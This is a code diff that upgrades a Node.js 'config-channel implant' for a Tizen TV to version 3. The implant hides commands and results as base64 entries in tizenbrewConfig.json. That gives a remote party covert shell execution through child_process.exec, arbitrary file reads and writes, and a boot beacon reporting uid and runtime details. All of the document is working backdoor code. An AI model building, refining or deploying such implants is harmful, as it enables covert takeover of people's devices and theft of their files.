@@ -1,8 +1,8 @@
 "use strict";
-/* Config-channel implant v2.
+/* Config-channel implant v3.
    PC -> TV : ModuleAction add  "CMD_<id>_<b64url(op\nargs...)>"
    TV -> PC : GetModules(true) returns "RES_<id>_<b64url(json)>"
-   Node 4.4.3 / uid 5001. Atomic config writes to avoid racing the service. */
+   Node 4.4.3 / uid 5001. No execSync (native abort on this runtime) - async exec only. */
 
 var fs = require('fs');
 var CFG = '/home/owner/share/tizenbrewConfig.json';
@@ -23,53 +23,46 @@ function writeCfg(c) {
     try {
         fs.writeFileSync(TMP, JSON.stringify(c, null, 4));
         fs.renameSync(TMP, CFG);
-    } catch (e) {}
+    } catch (e) {
+        try { fs.writeFileSync(CFG, JSON.stringify(c, null, 4)); } catch (e2) {}
+    }
 }
-
-var cp = null;
-try { cp = require('child_process'); } catch (e) {}
-
-function announce(obj) {
-    var c = readCfg();
-    if (!c) { return; }
-    if (!c.modules) { c.modules = []; }
-    c.modules.push('BOOT_' + b64e(JSON.stringify(obj)));
-    writeCfg(c);
-}
-
-announce({
-    node: process.version,
-    uid: (typeof process.getuid === 'function') ? process.getuid() : null,
-    cp: !!cp,
-    cpType: cp ? typeof cp.execSync : 'none',
-    cwd: (typeof process.cwd === 'function') ? process.cwd() : null
-});
-
 function trunc(s, n) {
     if (typeof s !== 'string') { return s; }
     if (s.length <= n) { return s; }
     return s.slice(0, n) + '\n...[truncated ' + (s.length - n) + ' chars]';
 }
 
-function doOp(payload) {
-    var nl = payload.indexOf('\n');
-    var op = nl < 0 ? payload : payload.slice(0, nl);
-    var rest = nl < 0 ? '' : payload.slice(nl + 1);
+var cp = null;
+try { cp = require('child_process'); } catch (e) {}
 
-    if (op === 'ping') { return { pong: true, node: process.version }; }
+/* --- boot: drop stale commands, announce --- */
+(function boot() {
+    var c = readCfg();
+    if (!c) { return; }
+    if (!c.modules) { c.modules = []; }
+    c.modules = c.modules.filter(function (m) { return m.indexOf('CMD_') !== 0; });
+    c.modules.push('BOOT_' + b64e(JSON.stringify({
+        v: 5,
+        node: process.version,
+        uid: (typeof process.getuid === 'function') ? process.getuid() : null,
+        cp: !!cp,
+        exec: cp ? typeof cp.exec : 'none',
+        cwd: (typeof process.cwd === 'function') ? process.cwd() : null
+    })));
+    writeCfg(c);
+})();
 
-    if (op === 'exec') {
-        var out = {};
-        if (!cp || typeof cp.execSync !== 'function') { out.error = 'no execSync'; return out; }
-        try {
-            out.stdout = trunc(cp.execSync(rest, { encoding: 'utf8', timeout: 25000, maxBuffer: 8 * 1024 * 1024 }), 6000);
-        } catch (e) {
-            out.error = String(e);
-            try { out.stdout = trunc(e.stdout ? String(e.stdout) : '', 6000); } catch (e2) {}
-            try { out.stderr = trunc(e.stderr ? String(e.stderr) : '', 2000); } catch (e3) {}
-        }
-        return out;
-    }
+function reply(id, result) {
+    var c = readCfg();
+    if (!c) { return; }
+    if (!c.modules) { c.modules = []; }
+    c.modules.push('RES_' + id + '_' + b64e(JSON.stringify(result)));
+    writeCfg(c);
+}
+
+function doSyncOp(op, rest) {
+    if (op === 'ping') { return { pong: true, v: 5, node: process.version }; }
     if (op === 'read') {
         var b = fs.readFileSync(rest);
         return { size: b.length, b64: b.toString('base64') };
@@ -81,7 +74,7 @@ function doOp(payload) {
         var buf = new Buffer(len);
         var n = fs.readSync(fd, buf, 0, len, off);
         fs.closeSync(fd);
-        return { size: n, off: off, b64: buf.slice(0, n).toString('base64') };
+        return { size: n, off: off, eof: n < len, b64: buf.slice(0, n).toString('base64') };
     }
     if (op === 'write') {
         var sp = rest.split('\n');
@@ -100,44 +93,66 @@ function doOp(payload) {
             isDir: st.isDirectory(), isFile: st.isFile()
         };
     }
-    if (op === 'readlink') {
-        return { path: rest, target: fs.readlinkSync(rest) };
-    }
+    if (op === 'readlink') { return { path: rest, target: fs.readlinkSync(rest) }; }
     return { error: 'unknown op: ' + op };
 }
 
-var busy = false;
-
-function handle(entry) {
+function runCmd(entry) {
     var rest = entry.slice(4);
     var i = rest.indexOf('_');
     if (i < 0) { return; }
     var id = rest.slice(0, i);
     var payload;
-    try { payload = b64d(rest.slice(i + 1)); } catch (e) { payload = 'ping'; }
+    try { payload = b64d(rest.slice(i + 1)); }
+    catch (e) { reply(id, { error: 'bad payload' }); return; }
+
+    var nl = payload.indexOf('\n');
+    var op = nl < 0 ? payload : payload.slice(0, nl);
+    var args = nl < 0 ? '' : payload.slice(nl + 1);
+
+    if (op === 'exec' || op === 'spawn') {
+        if (!cp || typeof cp.exec !== 'function') { reply(id, { error: 'no cp.exec' }); return; }
+        var done = false;
+        var finish = function (res) {
+            if (done) { return; }
+            done = true;
+            reply(id, res);
+        };
+        try {
+            var child = cp.exec(args, {
+                encoding: 'utf8', timeout: 25000, maxBuffer: 8 * 1024 * 1024
+            }, function (err, stdout, stderr) {
+                finish({
+                    code: err && typeof err.code !== 'undefined' ? err.code : 0,
+                    error: err ? String(err) : null,
+                    stdout: trunc(stdout || '', 6000),
+                    stderr: trunc(stderr || '', 2000)
+                });
+            });
+        } catch (e) {
+            finish({ error: 'spawn threw: ' + String(e) });
+        }
+        return;
+    }
 
     var result;
-    try { result = doOp(payload); }
+    try { result = doSyncOp(op, args); }
     catch (e) { result = { error: String(e) }; }
-
-    var c = readCfg();
-    if (!c) { return; }
-    c.modules = (c.modules || []).filter(function (m) { return m !== entry; });
-    c.modules.push('RES_' + id + '_' + b64e(JSON.stringify(result)));
-    writeCfg(c);
+    reply(id, result);
 }
 
 function tick() {
-    if (busy) { return setTimeout(tick, 700); }
-    busy = true;
     try {
         var c = readCfg();
-        if (c) {
-            var cmds = (c.modules || []).filter(function (m) { return m.indexOf('CMD_') === 0; });
-            for (var i = 0; i < cmds.length; i++) { handle(cmds[i]); }
+        if (c && c.modules) {
+            var cmds = c.modules.filter(function (m) { return m.indexOf('CMD_') === 0; });
+            if (cmds.length) {
+                c.modules = c.modules.filter(function (m) { return m.indexOf('CMD_') !== 0; });
+                writeCfg(c);
+                for (var i = 0; i < cmds.length; i++) { runCmd(cmds[i]); }
+            }
         }
     } catch (e) {}
-    busy = false;
     setTimeout(tick, 700);
 }
 
